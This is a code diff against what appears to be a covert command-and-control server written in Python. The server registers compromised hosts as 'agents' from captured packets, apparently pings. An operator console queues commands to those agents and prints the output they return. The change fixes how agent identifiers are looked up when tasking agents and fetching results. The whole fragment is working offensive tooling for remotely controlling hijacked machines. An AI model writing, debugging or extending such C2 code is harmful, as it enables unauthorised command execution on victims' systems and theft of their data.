@@ -67,7 +67,7 @@ def handle_packet(pkt):
                 return  # ignore noise or non-client pings
 
             src = pkt[IP].src
-            
+
             # print(f"\n[+] Valid client packet from {src}: {payload}")
 
             # Check if this IP is already registered
@@ -179,15 +179,16 @@ def operator_console():
                 print("Usage: task <agent_id|ip> <command>")
                 continue
             identifier = parts[1]
+            agent_id = find_agent_by_identifier(identifier)
             command_text = parts[2]
-            if not identifier:
+            if not agent_id:
                 print("No such agent (or stale).")
                 continue
             with lock:
                 # optional staleness check
-                COMMANDS.setdefault(identifier, []).append(command_text)
+                COMMANDS.setdefault(agent_id, []).append(command_text)
                 # report back which agent id and ip got the task
-                ip = AGENT_INFO.get(identifier, {}).get("ip")
+                ip = AGENT_INFO.get(agent_id, {}).get("ip")
                 print(f"\n[+] Queued command for id={identifier} ip={ip}: {command_text}")
             continue
 
@@ -196,11 +197,12 @@ def operator_console():
                 print("Usage: results <agent_id|ip>")
                 continue
             identifier = parts[1]
-            if not identifier:
+            agent_id = find_agent_by_identifier(identifier)
+            if not agent_id:
                 print("No such agent.")
                 continue
             with lock:
-                chunks = sorted(RESULTS.get(identifier, []))
+                chunks = sorted(RESULTS.get(agent_id, []))
                 if not chunks:
                     print(f"No results for {identifier}")
                     continue
@@ -208,7 +210,7 @@ def operator_console():
                 print(f"--- Results from id={identifier} ---")
                 print(full_result)
                 print("-------------------------------")
-                RESULTS[identifier] = []
+                RESULTS[agent_id] = []
             continue
 
         if cmd in ("quit", "exit"):
